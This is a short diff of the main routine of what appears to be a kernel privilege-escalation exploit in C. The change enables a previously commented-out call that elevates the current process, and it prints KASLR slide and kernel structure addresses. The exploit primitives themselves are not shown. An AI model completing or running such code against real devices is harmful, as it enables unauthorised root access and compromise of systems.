@@ -27,26 +27,26 @@ int initialize()
         }
     }
 
-    printf("\n\n");
+    printf("\n");
     return !(toolbox && toolbox->header && toolbox->commands && toolbox->offsets);
 }
 
-int elevateMe();
-
 int main()
 {
+    printf("\n[*] UID: %d, PID: %d\n", getuid(), getpid());
+
     if (initialize())
     {
         printf("Failed setup :(\n");
         return 1;
     }
 
-    printf("Base at: %llu, kaslr slide: %llu, kern struct: %llu\n", toolbox->base, toolbox->slide,
+    printf("\n[*] Base at: %llu, kaslr slide: %llu, kern struct: %llu", toolbox->base, toolbox->slide,
            toolbox->offsets->kernproc);
-    printf("UID: %d, PID: %d, self: %llu\n", geteuid(), getpid(), toolbox->offsets->myproc);
 
-    printf("\n[*] Stealing the keys and breaking myself out\n");
-    // elevateMe();
+    printf("\n[*] Stealing the keys and breaking myself out - ");
+    if (elevate(toolbox, getpid()))
+        return 1;
 
     return 0;
 }
